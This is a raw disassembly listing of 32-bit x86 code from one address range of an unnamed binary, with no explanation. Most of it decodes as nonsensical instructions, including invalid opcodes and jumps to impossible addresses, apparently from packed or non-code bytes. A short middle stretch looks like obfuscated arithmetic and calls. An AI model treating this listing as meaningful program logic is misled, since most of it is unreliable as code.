  410806:	fdivr  DWORD PTR [ebp+ecx*2+0x221000e1]
  41080d:	cmp    DWORD PTR [ebp+0x27],ebp
  410810:	pop    DWORD PTR [eax]
  410812:	mov    ch,0xd9
  410814:	test   bh,0x4b
  410817:	push   es
  410818:	sahf   
  410819:	daa    
  41081a:	jns    0x41082b
  41081c:	ror    BYTE PTR [ecx-0x5108c840],1
  410822:	mov    ch,0x91
  410824:	adc    BYTE PTR [eax+0x6b6137ff],bh
  41082a:	mov    esp,0x44eab3a
  41082f:	push   ds
  410830:	lods   al,BYTE PTR ds:[esi]
  410831:	icebp  
  410832:	ins    DWORD PTR es:[edi],dx
  410833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410834:	into   
  410835:	sub    DWORD PTR [ebx+edi*8+0x5d],0x47
  41083a:	jp     0x410888
  41083c:	xchg   BYTE PTR [ebp+0x5c7841db],dh
  410842:	adc    al,0x16
  410844:	inc    edi
  410846:	or     BYTE PTR [edx-0x2537762a],cl
  41084c:	inc    edx
  41084d:	mov    ebp,0x2a77db5a
  410852:	jmp    DWORD PTR [ebx]
  410854:	ins    BYTE PTR es:[edi],dx
  410855:	push   ds
  410856:	fnstcw WORD PTR [eax-0x58979be9]
  41085c:	clc    
  41085d:	mov    esi,ebx
  41085f:	loope  0x4108bc
  410861:	xor    DWORD PTR [edi+0x43],esi
  410864:	push   edi
  410865:	or     ebx,DWORD PTR [eax+0x7aa01c67]
  41086b:	fsub   DWORD PTR [eax-0x50]
  41086e:	mov    WORD PTR [ebx-0x1eae59c6],cs
  410874:	add    DWORD PTR [esi+0x39],0xffffff95
  410878:	pop    eax
  410879:	jmp    0x41087e
  41087b:	mov    dh,0xb7
  41087d:	in     eax,dx
  41087e:	clc    
  41087f:	test   BYTE PTR [ebp-0x78932765],cl
  410885:	fs jo  0x410813
  410888:	fisubr DWORD PTR [ebx]
  41088a:	mov    edx,0xa2975733
  41088f:	rol    DWORD PTR [edi+ebx*1+0x544a9740],0x9a
  410897:	cli    
  410898:	in     al,0x8
  41089a:	jns    0x4108c2
  41089c:	das    
  41089d:	ss test eax,eax
  4108a0:	mov    WORD PTR [edi-0x69],?
  4108a3:	dec    edi
  4108a4:	mov    ds:0xe97cedf4,eax
  4108a9:	pop    edx
  4108aa:	cwde   
  4108ab:	test   al,0xdc
  4108ad:	outs   dx,DWORD PTR ds:[esi]
  4108ae:	pop    ds
  4108af:	sbb    BYTE PTR ds:0xbc1c9a31,al
  4108b5:	inc    eax
  4108b6:	outs   dx,DWORD PTR ds:[esi]
  4108b7:	scas   eax,DWORD PTR es:[edi]
  4108b8:	jl     0x41086a
  4108ba:	je     0x4108e2
  4108bc:	or     al,0xd1
  4108be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108bf:	and    dl,BYTE PTR [edx]
  4108c1:	pushf  
  4108c2:	xchg   DWORD PTR ds:0x83dc86fa,ecx
  4108c8:	jmp    0x410868
  4108ca:	lahf   
  4108cb:	scas   eax,DWORD PTR es:[edi]
  4108cc:	push   ds
  4108cd:	add    ecx,DWORD PTR [esi-0x7c]
  4108d0:	(bad)  
  4108d1:	sub    DWORD PTR [eax],esi
  4108d3:	mov    ebx,DWORD PTR [ebp+esi*2+0x4a]
  4108d7:	mov    edi,0xeb7bed72
  4108dc:	push   ss
  4108dd:	xor    esi,DWORD PTR [ebx+0x7f8022ed]
  4108e3:	ret    
  4108e4:	adc    WORD PTR [ecx-0x1acbac79],ax
  4108eb:	mov    edx,0x88f4fcc9
  4108f0:	sbb    eax,0x9eb90b04
  4108f5:	dec    eax
  4108f6:	icebp  
  4108f7:	inc    edi
  4108f8:	fnsave [edi]
  4108fa:	dec    eax
  4108fb:	mov    edx,0x167e79da
  410900:	mov    bl,0x24
  410902:	jne    0x4108f7
  410904:	faddp  st(2),st
  410906:	dec    ecx
  410907:	pop    esp
  410908:	or     al,0x39
  41090a:	imul   ebx,DWORD PTR [edi],0x51fb46de
  410910:	inc    ebx
  410911:	outs   dx,DWORD PTR ds:[esi]
  410912:	loope  0x4108d5
  410914:	mov    DWORD PTR [esi+0x25d67b37],ebp
  41091a:	mov    ebp,0x8a06699d
  41091f:	jns    0x41098b
  410921:	mov    BYTE PTR [edi+0x1],ah
  410924:	mov    eax,0x63483ba5
  410929:	jmp    0x48cdd079
  41092e:	int3   
  41092f:	xor    ebx,DWORD PTR [edi+0x14]
  410932:	jne    0x410999
  410934:	out    dx,al
  410935:	jle    0x410939
  410937:	jno    0x410999
  410939:	mov    bl,0x53
  41093b:	ret    0x71b7
  41093e:	dec    eax
  41093f:	outs   dx,DWORD PTR ds:[esi]
  410940:	in     al,dx
  410941:	xor    bh,BYTE PTR [eax+0x59]
  410944:	pop    esp
  410945:	dec    esp
  410946:	adc    al,0xea
  410948:	push   eax
  410949:	daa    
  41094a:	aam    0x8f
  41094c:	mov    al,dl
  41094e:	add    edx,esi
  410950:	mov    dh,0x14
  410952:	mov    bh,0xd2
  410954:	loope  0x41096e
  410956:	fidivr DWORD PTR [edx]
  410958:	mov    ebx,0xc77c3834
  41095d:	adc    DWORD PTR [ebx-0x56],ebx
  410960:	jge    0x41098f
  410962:	sub    eax,0xcf21d3d4
  410967:	inc    edi
  410968:	int    0x2f
  41096a:	xchg   DWORD PTR [eax+0x437158ca],esp
  410970:	es icebp 
  410972:	(bad)  
  410973:	push   ebx
  410974:	js     0x410915
  410976:	sub    ebx,DWORD PTR [eax-0x4c855f46]
  41097c:	adc    DWORD PTR [ebx],esi
  41097e:	imul   esp,DWORD PTR [eax+0x5c],0x26
  410982:	jg     0x4109ed
  410984:	jne    0x4109ae
  410986:	std    
  410987:	mov    BYTE PTR [edi-0x7af45d3],bl
  41098d:	mov    cl,0xa
  41098f:	ins    BYTE PTR es:[edi],dx
  410990:	inc    ecx
  410991:	hlt    
  410992:	(bad)  
  410993:	xchg   ecx,eax
  410994:	and    al,0x5a
  410996:	shl    BYTE PTR [esi+eax*1],1
  410999:	jbe    0x4109d7
  41099b:	fdiv   st(5),st
  41099d:	pop    ebp
  41099e:	adc    eax,0x192d3304
  4109a3:	ret    
  4109a4:	mov    ecx,0x7fb7c3e3
  4109a9:	inc    ebx
  4109aa:	lea    ebp,[esp+eiz*2+0x510486f8]
  4109b1:	xchg   esi,eax
  4109b2:	sbb    dh,al
  4109b4:	jns    0x410997
  4109b6:	push   esp
  4109b7:	xor    al,0x8c
  4109b9:	adc    DWORD PTR [ebp+ecx*1+0x58c4],esp
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x422031
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x422031
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0xaa290aa6
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [ecx+0x74274c19],cl
  410a81:	jae    0x410a73
  410a83:	ss sbb dh,0xb0
  410a87:	cmp    ch,BYTE PTR [eax]
  410a89:	repnz fild WORD PTR [ecx]
  410a8c:	hlt    
  410a8d:	sbb    BYTE PTR [esi-0x37b3ccfd],0x6f
  410a94:	jo     0x410a33
  410a96:	mov    edx,0xb64931e1
  410a9b:	imul   ebp,DWORD PTR [ecx],0x89c91ea5
  410aa1:	call   0x457e:0xad95cd77
  410aa8:	sub    BYTE PTR [ecx-0x8],dh
  410aab:	push   0x2c
  410aad:	jns    0x410a41
  410aaf:	cld    
  410ab0:	shl    DWORD PTR [edx+0x0],0x5
  410ab4:	iret   
  410ab5:	xor    esi,DWORD PTR [ebx+0x57443cd1]
  410abb:	jmp    0xfdc9091b
  410ac0:	int    0x28
  410ac2:	xor    BYTE PTR [ebx+eax*8],cl
  410ac5:	push   sp
  410ac7:	sti    
  410ac8:	sbb    al,0xd4
  410aca:	cmp    eax,0xa38e34f3
  410acf:	inc    ebp
  410ad0:	jl     0x410b48
  410ad2:	and    dl,BYTE PTR [ecx]
  410ad4:	icebp  
  410ad5:	adc    bh,BYTE PTR [ecx]
  410ad7:	cld    
  410ad8:	dec    DWORD PTR [esi]
  410ada:	mov    esp,0x780bff5f
  410adf:	push   0xffffff8f
  410ae1:	shl    DWORD PTR [edx+0x61],0x45
  410ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae6:	sbb    BYTE PTR [edi],0x7d
  410ae9:	int3   
  410aea:	jmp    0x52ed:0x2de9e192
  410af1:	popf   
  410af2:	add    al,BYTE PTR [esi]
  410af4:	out    dx,eax
  410af5:	fs inc ebx
  410af7:	(bad)
  410afb:	lea    ecx,[esi+0x44]
  410afe:	jmp    0x410b2a
  410b00:	mov    BYTE PTR [edi],ch
  410b02:	jmp    0x9c88:0x2245e0b1
  410b09:	and    eax,0x9b454c41
  410b0e:	dec    esi
  410b0f:	inc    edx
  410b10:	mov    al,0x12
  410b12:	jecxz  0x410b11
  410b14:	adc    DWORD PTR [eax-0x6e],0x199fdb3
  410b1b:	bound  esp,QWORD PTR [ecx]
  410b1d:	enter  0x3ae3,0xca
  410b21:	sti    
  410b22:	jge    0x410b50
  410b24:	leave  
  410b25:	mov    ecx,ss
  410b27:	pop    ebp
  410b28:	sub    ebp,DWORD PTR ds:0xfcc4585
  410b2e:	cmp    eax,0x609f4d31
  410b33:	inc    ebp
  410b34:	pop    eax
  410b35:	mov    DWORD PTR [edx],ebx
  410b37:	in     al,dx
  410b38:	ss sbb al,0x40
  410b3b:	pusha  
  410b3c:	into   
  410b3d:	jle    0x410b76
  410b3f:	sbb    edx,esi
  410b41:	fxch   st(0)
  410b43:	push   eax
  410b44:	dec    eax
  410b45:	in     al,0xb2
  410b47:	cmp    DWORD PTR [edi+edi*2],ebp
  410b4a:	pop    edi
  410b4b:	dec    ebx
  410b4c:	test   eax,0x697bce14
  410b51:	cmc    
  410b52:	dec    ecx
  410b53:	sub    esp,DWORD PTR [ebp-0x2b]
  410b56:	stos   BYTE PTR es:[edi],al
  410b57:	clc    
  410b58:	je     0x6a180f6c
  410b5e:	dec    esp
  410b5f:	clc    
  410b60:	inc    eax
  410b61:	pop    ecx
  410b62:	cmp    ebp,DWORD PTR [ecx+edi*1]
  410b65:	mov    eax,0x26c50300
  410b6a:	push   esp
  410b6b:	xchg   ecx,eax
  410b6c:	les    edi,FWORD PTR [ebp+0xb]
  410b6f:	mov    ds:0x3e22e4af,eax
  410b74:	inc    ecx
  410b75:	jo     0x410b8b
  410b77:	sbb    DWORD PTR [eax+0x7b],0xffffffda
  410b7b:	arpl   WORD PTR [ecx+0x33ee926e],bp
  410b81:	push   eax
  410b82:	cmp    al,0x92
  410b84:	xor    BYTE PTR [ebx],cl
  410b86:	outs   dx,BYTE PTR ds:[esi]
  410b87:	(bad)  
  410b88:	xacquire xchg BYTE PTR [edi],al
  410b8b:	dec    ebp
  410b8c:	out    dx,eax
  410b8d:	retf   
  410b8e:	push   edx
  410b8f:	and    BYTE PTR [edx-0x30],ah
  410b92:	repnz addr16 and eax,0x56dab1ec
  410b99:	sbb    eax,0x817cc96
  410b9e:	xlat   BYTE PTR ds:[ebx]
  410b9f:	jb     0x410ba7
  410ba1:	in     eax,dx
  410ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ba3:	icebp  
  410ba4:	mov    dh,BYTE PTR [ecx+0x5d]
  410ba7:	adc    edi,DWORD PTR [eax]
  410ba9:	ss adc dl,bh
  410bac:	push   ecx
  410bad:	pop    edx
  410bae:	gs pop edx
  410bb0:	rcl    DWORD PTR [eax],0x2f
  410bb3:	jb     0x410be5
  410bb5:	(bad)  
  410bb6:	std    
  410bb7:	jp     0x410c08
  410bb9:	mov    eax,0xc558213
  410bbe:	(bad)  
  410bbf:	out    0x9e,eax
  410bc1:	jmp    0x1267:0xe5c69add
  410bc8:	sti    
  410bc9:	loop   0x410b9a
  410bcb:	sub    BYTE PTR [eax-0x7b],ah
  410bce:	in     eax,dx
  410bcf:	sahf   
  410bd0:	pop    ecx
  410bd1:	std    
  410bd2:	mov    eax,ds:0xf4378766
  410bd7:	jae    0x410bee
  410bd9:	loop   0x410b79
  410bdb:	jl     0x410c40
  410bdd:	aam    0x73
  410bdf:	retf   
  410be0:	mov    ah,0xfd
  410be2:	xor    eax,0xdd66453d
  410be7:	lods   al,BYTE PTR ds:[esi]
  410be8:	push   ss
  410be9:	shl    DWORD PTR [edi+0x7d],1
  410bec:	jnp    0x410bcb
  410bee:	mov    ecx,DWORD PTR [eax-0x66]
  410bf1:	dec    ebp
  410bf2:	cwde   
  410bf3:	je     0x410bb9
  410bf5:	test   ecx,ebp
  410bf7:	aas    
  410bf8:	or     eax,0x4dbe261f
  410bfd:	or     eax,0x23d9be09
  410c02:	imul   esi,DWORD PTR [ebx-0xf31d3b9],0x2b
  410c09:	in     al,dx
  410c0a:	and    esp,DWORD PTR [edi]
  410c0c:	das    
  410c0d:	and    al,0x49
  410c0f:	push   edx
  410c10:	mov    WORD PTR [eax],?
  410c12:	ret    
  410c13:	and    ch,BYTE PTR [edi-0x17]
  410c16:	arpl   WORD PTR [ecx+edx*2],dx
  410c19:	ficomp WORD PTR [ebp-0x2b]
  410c1c:	inc    esp
  410c1d:	retf   0xab38
  410c20:	ins    DWORD PTR es:[edi],dx
  410c21:	lds    eax,FWORD PTR [esi+ebp*1]
  410c24:	bound  dx,DWORD PTR [ecx+0x3f7fd0e5]
  410c2b:	inc    ebx
  410c2c:	mov    es,ebp
  410c2e:	repz jle 0x410caf
  410c31:	push   es
  410c32:	dec    ebx
  410c33:	xchg   ebx,eax
  410c34:	sub    BYTE PTR [eax+0xee1a95],bl
  410c3a:	fmul   st,st(1)
  410c3c:	ss pop ebx
  410c3e:	mov    edx,0x80f23004
  410c43:	repnz dec ebp
  410c45:	pop    ecx
  410c46:	js     0x410cac
  410c48:	cmp    esp,ebp
  410c4a:	jmp    0xefff68b5
  410c4f:	cmp    al,0x1a
  410c51:	xor    al,0xad
  410c53:	jmp    FWORD PTR [ecx+edi*8-0x5bc28597]
  410c5a:	push   es
  410c5b:	push   es
  410c5c:	mov    al,ds:0x1e833ecf
  410c61:	push   ss
  410c62:	pop    es
  410c63:	pusha  
  410c64:	sbb    esi,DWORD PTR [edi-0x69]
  410c67:	fcom   DWORD PTR [edi-0x65]
  410c6a:	ret    0x8c07
  410c6d:	pop    ds
  410c6e:	sbb    BYTE PTR [edx+ebp*4+0x54cc3973],dh
  410c75:	mov    BYTE PTR [edi+0x52],dh
  410c78:	cmc    
  410c79:	mov    ah,0x1
  410c7b:	push   esp
  410c7c:	stos   DWORD PTR es:[edi],eax
  410c7d:	call   0x2bd6:0x1eb84079
  410c84:	mov    BYTE PTR [ebx],0xe5
  410c87:	pop    es
  410c88:	or     BYTE PTR [edi-0x18],bl
  410c8b:	xor    edi,DWORD PTR [edx+0x54]
  410c8e:	in     al,dx
  410c8f:	cdq    
  410c90:	fs std 
  410c92:	data16 adc al,0x1b
  410c95:	and    ah,0x7e
  410c98:	cmp    DWORD PTR [edi],ebp
  410c9a:	or     bh,BYTE PTR [edx]
  410c9c:	jecxz  0x410c38
  410c9e:	and    BYTE PTR [esi+ebp*2+0x6e67cb1e],ah
  410ca5:	add    eax,0x8d5e677e
  410caa:	jne    0x410ce1
  410cac:	sbb    DWORD PTR [ebx-0x2d],0x8b9e2669
  410cb3:	add    esp,edi
  410cb5:	or     ebx,DWORD PTR [esi+eax*8]
  410cb8:	fidivr WORD PTR [ebp+ebp*1-0xcd15cd1]
  410cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cc0:	jb     0x410cd7
  410cc2:	pop    esp
  410cc3:	es mov al,cl
  410cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc7:	or     DWORD PTR [ebp+0x45a84053],ebp
  410ccd:	xor    edi,edi
  410ccf:	(bad)  
  410cd0:	cmp    dh,BYTE PTR [eax-0x21]
  410cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cd4:	add    ecx,DWORD PTR [ebp+0x30]
  410cd7:	fdivr  DWORD PTR [esi-0x5a398d4]
  410cdd:	jle    0x410ce3
  410cdf:	fadd   st,st(2)
  410ce1:	ja     0x410d15
  410ce3:	int    0xc4
  410ce5:	mov    bh,BYTE PTR [esi]
  410ce7:	xor    BYTE PTR [eax],ah
  410ce9:	add    dl,cl
  410ceb:	les    eax,FWORD PTR [edx+eiz*8-0x6c]
  410cef:	adc    al,0x16
  410cf1:	repnz lods eax,DWORD PTR ds:[esi]
  410cf3:	out    0x10,al
  410cf5:	pop    esp
  410cf6:	cmp    DWORD PTR [esi+0x3d462093],edx
  410cfc:	ins    BYTE PTR es:[edi],dx
  410cfd:	add    DWORD PTR [esi],ecx
  410cff:	in     eax,dx
  410d00:	and    al,0x58
  410d02:	mov    edi,0x812142a8
  410d07:	outs   dx,DWORD PTR ds:[esi]
  410d08:	and    edi,DWORD PTR [edx+edx*1]
  410d0b:	mov    ah,0xe9
  410d0d:	push   ss
  410d0e:	sub    al,BYTE PTR [edx+0x5c]
  410d11:	mov    fs,edx
  410d13:	inc    ebx
  410d14:	jne    0x410cd1
  410d16:	fcmove st,st(2)
  410d18:	xor    ch,BYTE PTR [ecx-0x25]
  410d1b:	popa   
  410d1c:	adc    edi,DWORD PTR [esi+edx*1+0x2e]
  410d20:	sar    eax,0xe9
  410d23:	mov    bh,BYTE PTR [esi-0x63]
  410d26:	iret   
  410d27:	mov    dh,0xb9
  410d29:	(bad)  
  410d2a:	fisub  WORD PTR [ecx+0x12]
  410d2d:	daa    
  410d2e:	lods   eax,DWORD PTR ds:[esi]
  410d2f:	and    BYTE PTR [edi+0x6d],ch
  410d32:	loop   0x410cd3
  410d34:	popa   
  410d35:	xchg   ebx,eax
  410d36:	jns    0x410d4b
  410d38:	dec    esi
  410d39:	jnp    0x410cde
  410d3b:	xor    edx,DWORD PTR [eax]
  410d3d:	sti    
  410d3e:	and    eax,0xc7fc7d89
  410d43:	inc    ebp
  410d44:	hlt    
  410d45:	mov    ch,BYTE PTR [eax+eax*1]
  410d48:	add    BYTE PTR [ebx+0x1b8f44d],cl
  410d4e:	inc    esp
  410d4f:	add    BYTE PTR [eax],al
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffff91
  410d65:	pop    edi
  410d66:	push   ecx
  410d67:	jle    0x410dd6
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0xea42:0x9e181814
  410d73:	div    edx
  410d75:	scas   eax,DWORD PTR es:[edi]
  410d76:	(bad)  [eax-0x36]
  410d79:	sti    
  410d7a:	and    DWORD PTR [eax-0x61],ebp
  410d7d:	pop    es
  410d7e:	jae    0x410d24
  410d80:	repnz xor ch,cl
  410d83:	out    0xb2,eax
  410d85:	psubq  mm6,QWORD PTR [edx+0x8]
  410d89:	xchg   DWORD PTR [eax-0x16],ebp
  410d8c:	xlat   BYTE PTR ds:[ebx]
  410d8d:	shl    BYTE PTR [ebx],1
  410d8f:	dec    eax
  410d90:	in     eax,0x46
  410d92:	inc    ecx
  410d93:	push   eax
  410d94:	loop   0x410dfe
  410d96:	mov    edi,0xe9ec00da
  410d9b:	les    ebp,FWORD PTR cs:[edi-0x77]
  410d9f:	les    ebx,FWORD PTR [esi]
  410da1:	push   ds
  410da2:	hlt    
  410da3:	inc    edi
  410da4:	sub    dl,BYTE PTR [eax]
  410da6:	or     ecx,DWORD PTR [ebp+0x7f]
  410da9:	lds    ebx,FWORD PTR [ecx]
  410dab:	dec    esi
  410dac:	in     eax,0xaa
  410dae:	mov    WORD PTR [ecx-0x4072d5b8],ss
  410db4:	call   0x9a8b:0xed3b4678
  410dbb:	sbb    BYTE PTR [ecx+0x49a92dcb],ch
  410dc1:	imul   edi,DWORD PTR [ecx+0x29],0xffffff9d
  410dc5:	lds    edi,FWORD PTR [ebx-0x32516c5b]
  410dcb:	mov    esp,0x2257da73
  410dd0:	push   0xb187cd66
  410dd5:	mov    al,0x74
  410dd7:	xchg   edx,eax
  410dd8:	sub    eax,0x597c127
  410ddd:	lock test DWORD PTR [edi],0x5123b777
  410de4:	popa   
  410de5:	ins    DWORD PTR es:[edi],dx
  410de6:	mov    cl,0xd9
  410de8:	or     al,0x90
  410dea:	fnstcw WORD PTR [edi+0x2b]
  410ded:	mov    ebp,0xc68ae09a
  410df2:	adc    esi,ecx
  410df4:	adc    edx,DWORD PTR [eax+0x78]
  410df7:	mov    ah,0x47
  410df9:	dec    esp
  410dfa:	add    eax,0x49189dca
  410dff:	jnp    0x410d9d
  410e01:	push   esi
  410e02:	add    BYTE PTR [ebx+ebp*2+0x67],ah
  410e06:	clc    
  410e07:	cmp    al,0x55
  410e09:	enter  0xffbb,0x3f
  410e0d:	mov    eax,0xcd3629d9
  410e12:	push   esi
  410e13:	mov    al,ds:0x8317436b
  410e18:	enter  0xdd99,0x53
  410e1c:	xor    eax,0xf5c86c31
  410e21:	lahf   
  410e22:	iret   
  410e23:	and    DWORD PTR [eax],edi
  410e25:	sub    eax,0x25797a89
  410e2a:	jmp    0x4bc8d9a
  410e2f:	lods   al,BYTE PTR ds:[esi]
  410e30:	adc    eax,edx
  410e32:	push   ds
  410e33:	add    DWORD PTR [edi+0x551e1325],ecx
  410e39:	fcmovnb st,st(6)
  410e3b:	test   BYTE PTR ds:0x75bfb56a,dl
  410e41:	jle    0x410e77
  410e43:	xchg   ebx,eax
  410e44:	(bad)  
  410e45:	cmp    ebx,DWORD PTR [ebx+0x5e88be32]
  410e4b:	jno    0x410e0a
  410e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e4e:	test   BYTE PTR [ebx],ch
  410e50:	sbb    esi,DWORD PTR [ecx+0x5c]
  410e53:	or     al,0x43
  410e55:	and    al,0x28
  410e57:	sbb    eax,0xfca08c67
  410e5c:	adc    DWORD PTR [edi+0x7e],ebx
  410e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e60:	or     BYTE PTR [eax+eiz*2-0x34],bh
  410e64:	sahf   
  410e65:	cmp    edx,DWORD PTR [esi]
  410e67:	adc    al,0xf2
  410e69:	sahf   
  410e6a:	fmul   QWORD PTR [edx]
  410e6c:	inc    ecx
  410e6d:	lds    ebp,FWORD PTR [edx+0x59a1fdb6]
  410e73:	mov    edi,0x2ecdbde6
  410e78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e79:	mov    WORD PTR [edi+edi*8-0x2b],fs
  410e7d:	dec    ebx
  410e7e:	ret    
  410e7f:	cld    
  410e80:	enter  0x887b,0xa2
  410e84:	mov    edi,0x5cf9d278
  410e89:	imul   ecx,DWORD PTR [esi+0x18],0x37
  410e8d:	fld    TBYTE PTR ds:0xff151dbf
  410e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e94:	jns    0x410e95
  410e96:	shl    DWORD PTR [edi],0x78
  410e99:	mov    bl,0x49
  410e9b:	shl    ecx,0x4d
  410e9e:	sbb    eax,0xf965abd3
  410ea3:	mov    dh,0x1a
  410ea5:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410ea7:	ja     0x410ece
  410ea9:	add    esi,ebp
  410eab:	loope  0x410ed4
  410ead:	push   eax
  410eae:	jbe    0x410eda
  410eb0:	sub    eax,0xa14c2295
  410eb5:	mov    esp,0x34719752
  410eba:	push   eax
  410ebb:	jne    0x410efd
  410ebd:	lgs    ebp,FWORD PTR [edi]
  410ec0:	sbb    al,0xf1
  410ec2:	mov    ah,0x98
  410ec4:	jb     0x410f1a
  410ec6:	push   ebx
  410ec7:	call   0x90b57697
  410ecc:	add    eax,0xc9e1dfc4
  410ed1:	cmp    DWORD PTR [edx],eax
  410ed3:	fiadd  DWORD PTR [ebp-0x73]
  410ed6:	pop    ds
  410ed7:	cli    
  410ed8:	push   edi
  410ed9:	mov    dh,BYTE PTR [ebp+0x2e2921cb]
  410edf:	out    0x4c,al
  410ee1:	test   BYTE PTR [esi+0x32],dh
  410ee4:	test   eax,0x2e2c4c70
  410ee9:	fsubr  DWORD PTR [edx+0x23a9426d]
  410eef:	mov    al,ds:0x1ee5b331
  410ef4:	ficom  WORD PTR [ebp-0x9]
  410ef7:	pop    esi
  410ef8:	das    
  410ef9:	push   ebp
  410efa:	out    dx,al
  410efb:	jbe    0x410f1f
  410efd:	test   eax,0xad48bf19
  410f02:	mov    al,0x71
  410f04:	lods   eax,DWORD PTR ds:[esi]
  410f05:	and    cl,BYTE PTR [ecx-0x56]
  410f08:	cmp    BYTE PTR [esi-0x33],ch
  410f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f0c:	sbb    eax,0xcd685cdd
  410f11:	out    0x9c,eax
  410f13:	imul   edi,DWORD PTR [ebp+0x8027ff3],0x70d147ed
  410f1d:	xor    DWORD PTR [ebx],esi
  410f1f:	cmc    
  410f20:	and    DWORD PTR [edx-0x661a8c60],0x3fe739aa
  410f2a:	push   eax
  410f2c:	cmp    esi,eax
  410f2e:	cs adc eax,0xf75e948a
  410f34:	add    BYTE PTR [ecx-0x1f0d7506],ah
  410f3a:	add    eax,0x3d769a59
  410f3f:	push   edx
  410f40:	adc    eax,0xa723075c
  410f45:	(bad)  
  410f46:	cmp    cl,cl
  410f48:	xchg   edi,eax
  410f49:	aaa    
  410f4a:	test   BYTE PTR [ecx+0x77],dh
  410f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f4e:	sbb    al,0x73
  410f50:	xlat   BYTE PTR ds:[ebx]
  410f51:	pop    ss
  410f52:	mov    WORD PTR ds:0xf85f7951,cs
  410f58:	xchg   BYTE PTR [edx+0x32],bl
  410f5b:	push   ss
  410f5c:	mov    BYTE PTR [ebx-0x1e2e0fcf],0x76
  410f63:	xor    al,0xb1
  410f65:	out    0xef,al
  410f67:	popa   
  410f68:	adc    esi,eax
  410f6a:	ja     0x410f2f
  410f6c:	sbb    BYTE PTR [esp+edi*4+0x42],ch
  410f70:	rol    dl,0x38
  410f73:	sbb    BYTE PTR [di+0x34c7],0x96
  410f79:	loope  0x410f3c
  410f7b:	push   es
  410f7c:	in     eax,0x24
  410f7e:	fdiv   DWORD PTR [edi-0x2fd44acb]
  410f84:	sub    ebp,DWORD PTR [edi+0x46738819]
  410f8a:	and    edx,DWORD PTR [esi+ecx*8]
  410f8d:	mov    ebp,0x3432bcea
  410f92:	lea    esp,[esi-0x34f6f0f1]
  410f98:	fiadd  DWORD PTR [ebx]
  410f9a:	mov    ebx,0xaeaeb949
  410f9f:	and    DWORD PTR [esi],0xa8cfe8ea
  410fa5:	push   edi
  410fa6:	push   cs
  410fa7:	xchg   ebx,eax
  410fa8:	sub    bh,cl
  410faa:	js     0x410f9c
  410fac:	pop    ecx
  410fad:	mov    al,0x76
  410faf:	push   ebp
  410fb0:	jmp    0x90d5bda8
  410fb5:	xor    al,0xfd
  410fb7:	jb     0x410f9f
  410fb9:	adc    al,0x11
  410fbb:	(bad)  
  410fbc:	std    
  410fbd:	fcomp  DWORD PTR [edx]
  410fbf:	mov    ds,edx
  410fc1:	push   esi
  410fc2:	xchg   BYTE PTR [edi+ecx*8],cl
  410fc5:	popa   
  410fc6:	inc    esi
  410fc7:	test   BYTE PTR [esi],dh
  410fc9:	lods   eax,DWORD PTR ds:[esi]
  410fca:	xor    ecx,DWORD PTR [esi]
  410fcc:	aad    0x4d
  410fce:	push   0x2f07e82e
  410fd3:	iret   
  410fd4:	leave  
  410fd5:	mov    bl,0x9
  410fd7:	call   0xb4d36103
  410fdc:	add    ebx,DWORD PTR [eax+0x3]
  410fdf:	add    eax,0xff9866c5
  410fe4:	mov    esi,0xbc65c7af
  410fe9:	(bad)  
  410fea:	xlat   BYTE PTR ds:[ebx]
  410feb:	lea    esi,[edi]
  410fed:	adc    DWORD PTR [edi-0x62],ebx
  410ff0:	and    DWORD PTR [edx],ebx
  410ff2:	adc    al,0xbb
  410ff4:	stos   DWORD PTR es:[edi],eax
